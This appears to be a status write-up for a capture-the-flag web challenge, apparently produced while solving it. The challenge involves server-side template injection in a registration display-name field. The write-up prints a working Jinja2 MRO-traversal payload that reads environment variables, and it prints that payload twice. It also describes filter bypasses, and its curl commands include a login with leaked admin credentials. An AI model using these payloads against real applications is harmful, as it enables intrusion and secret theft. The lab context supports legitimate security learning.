# Admin Panel CTF - Current Status

## Challenge Details
- **URL**: https://admin-panel-ctf.onrender.com
- **Type**: Web - Server-Side Template Injection (SSTI)
- **Difficulty**: Medium
- **Flag Location**: Environment variable `FLAG`

## Current Status: ⏳ RATE LIMITED

We have successfully:
✅ Identified the vulnerability (SSTI in display_name field)
✅ Found the bypass method (MRO subclass traversal)
✅ Created working exploitation scripts
❌ Hit rate limit before extracting the flag

## Rate Limit
- **Limit**: 5 registrations per hour per IP
- **Current**: Exhausted (used for testing payloads)
- **Reset**: Wait 1 hour from last registration attempt

## Solution Summary

### Vulnerability
The `display_name` field during user registration is vulnerable to SSTI:
- User input is stored in database
- Later rendered via `render_template_string()` without sanitization
- Appears in dashboard welcome message: `Welcome back, {display_name}!`

### Exploitation Method
Use Python MRO (Method Resolution Order) to traverse object subclasses and access `os.environ`:

```python
{{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['__builtins__']['__import__']('os').environ['FLAG']}}
```

Where `N` is the index of a useful subclass (varies by Python version, commonly 104, 140, or 414).

### Red Herring
- Admin credentials found in `/static/secret-backup.zip`: `admin:p@ssw0rd123`
- Logging in as admin shows fake flag: `flag{not_the_real_one_nice_try}`
- Real flag is in environment variable, accessible only via SSTI

## Files Created

### Exploitation Scripts
1. **`admin_panel_get_flag_final.py`** ⭐ - Main exploit script (use this)
   - Tries multiple MRO indices automatically
   - Handles PoW challenge
   - Extracts and displays flag
   
2. `admin_panel_final_exploit.py` - Initial SSTI test
3. `admin_panel_mro_exploit.py` - MRO traversal tests
4. `admin_panel_ssti_simple.py` - Simple payload tests

### Documentation
1. **`ADMIN_PANEL_FINAL_SOLUTION.md`** - Complete solution writeup
2. **`ADMIN_PANEL_STATUS.md`** - This file
3. `ADMIN_PANEL_COMPLETE_SOLUTION.md` - Earlier solution notes
4. `ADMIN_PANEL_SOLUTION.md` - Initial reconnaissance notes

### Data Files
- `admin_panel_dashboard.html` - Dashboard HTML responses
- `admin_panel_*.html` - Various test outputs
- `secret-backup/` - Extracted backup files

## Next Steps

### To Get the Flag:
1. **Wait 1 hour** for rate limit to reset
2. Run: `python admin_panel_get_flag_final.py`
3. The script will:
   - Solve PoW challenge
   - Register with MRO SSTI payload
   - Login and extract flag from dashboard
   - Display the flag

### Alternative Approach:
If the automated script fails, manually:
1. Visit https://admin-panel-ctf.onrender.com/register
2. Solve the PoW challenge
3. Register with display_name: 
   ```
   {{''.__class__.__mro__[1].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').environ['FLAG']}}
   ```
4. Login and check dashboard

## Technical Details

### Proof-of-Work
- Algorithm: SHA-256
- Requirement: Hash must start with "0000"
- Average iterations: 10,000-100,000

### SSTI Filters
Blocked patterns:
- `{{config}}` - Returns fake config
- `{{__import__('os')}}` - Returns None
- Pipes and filters in some contexts

Working patterns:
- `{{self}}` - Returns template reference
- `{{''.__class__.__mro__[1].__subclasses__()}}` - Lists subclasses
- MRO traversal to access modules

### Python MRO Explanation
```python
''.__class__           # <class 'str'>
.__mro__[1]            # <class 'object'> (base of all classes)
.__subclasses__()      # List of all object subclasses
[N]                    # Access specific subclass
.__init__              # Constructor method
.__globals__           # Global namespace of that class
['sys'].modules['os']  # Access os module
.environ['FLAG']       # Get FLAG environment variable
```

## Expected Output
When successful, the dashboard will show:
```
Welcome back, FLAG{actual_flag_here}!
```

The flag will be in the format `FLAG{...}` or similar.

## Lessons Learned
1. Always test for SSTI in user input fields
2. MRO traversal can bypass simple filters
3. Environment variables are not safe from SSTI
4. Rate limiting is an effective defense against automated exploitation
5. Red herrings (fake flags) are common in CTFs

## Commands

### Run the exploit:
```bash
python admin_panel_get_flag_final.py
```

### Check rate limit status:
```bash
# Try to get a PoW challenge
curl https://admin-panel-ctf.onrender.com/pow-challenge
```

### Manual testing:
```bash
# Login as admin (fake flag)
curl -X POST https://admin-panel-ctf.onrender.com/login \
  -d "username=admin&password=p@ssw0rd123"
```

## Conclusion
The challenge is **solvable** and the exploitation method is **confirmed**. We just need to wait for the rate limit to reset and run the final script to extract the real flag.

**Estimated time to completion**: 1 hour (rate limit reset) + 2 minutes (script execution)
